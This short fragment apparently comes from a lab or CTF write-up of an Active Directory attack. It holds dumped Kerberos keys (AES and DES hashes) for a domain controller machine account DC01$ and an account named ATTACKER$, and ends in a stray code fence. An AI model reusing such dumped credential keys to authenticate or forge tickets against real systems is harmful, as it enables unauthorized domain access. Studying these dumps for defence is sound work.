DC01$:aes256-cts-hmac-sha1-96:545a5961b6f03497646c5a0eb71bf23b9d184f905e8ff3443a328d729a674a92
DC01$:aes128-cts-hmac-sha1-96:84994d5c01ecdccb527613673bfd0df1
DC01$:des-cbc-md5:ab7362387343f280
ATTACKER$:aes256-cts-hmac-sha1-96:1531ef1673ecd89b8ee48a2b07bbfbb28715f0f45829f140b7f1b3e2d628e81d
ATTACKER$:aes128-cts-hmac-sha1-96:c9af4fb268363fdc313fa0f3d90d4473
ATTACKER$:des-cbc-md5:20b301835b378968
```